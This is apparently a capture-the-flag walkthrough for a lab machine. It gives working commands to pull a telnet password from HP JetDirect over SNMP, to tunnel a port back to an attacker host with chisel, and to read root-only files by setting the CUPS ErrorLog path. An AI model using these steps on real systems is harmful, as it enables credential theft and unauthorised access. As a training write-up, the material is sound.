antique
---

## Steps

1. nmap TCP UDP

TCP: 23

UDP: 161

2. SNMP Exploit

Connecting via telnet, we see that its running HP JetDirect, which has a vulnerability that allows passwords to be exfiltrated through SNMP

`snmpwalk -v 2c -c public <host> .1.3.6.1.4.1.11.2.3.9.1.1.13.0`

Decode the hex, and you get the password for telnet

3. telnet exec reverse shell

Once in telnet, you can exec commands, and read the user flag, or create a reverse shell connection

## Root Flag

1. Port Forwarding

We see a service running on port 631

Use `chisel` to port forward

```
Attacker
sudo ./chisel server -p 8000 --reverse

Victim
./chisel client <attacker>:8000 R:631:127.0.0.1:631
```

2. CUPS vulnerability

Under `Administrator->View Error Log`, it reads whatever file is set as ErrorLog at the back end

`cupsctl ErrorLog="/root/root.txt"`
